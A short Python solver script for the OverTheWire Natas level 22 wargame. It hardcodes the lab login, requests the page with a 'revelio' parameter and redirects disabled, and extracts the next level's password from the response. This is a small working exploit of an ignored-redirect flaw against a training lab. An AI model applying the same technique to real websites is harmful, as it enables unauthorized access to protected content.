import requests
import re

username = "natas22"
passsowrd = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"

url = "http://%s.natas.labs.overthewire.org/?revelio=1"%username

sesssion = requests.Session()
response = sesssion.get(url,auth=(username,passsowrd) , allow_redirects=False )
content = response.text

flag = re.findall("Username: natas23\nPassword: (.*)</pre>",content)[0]

print("[+] Gotcha ",flag)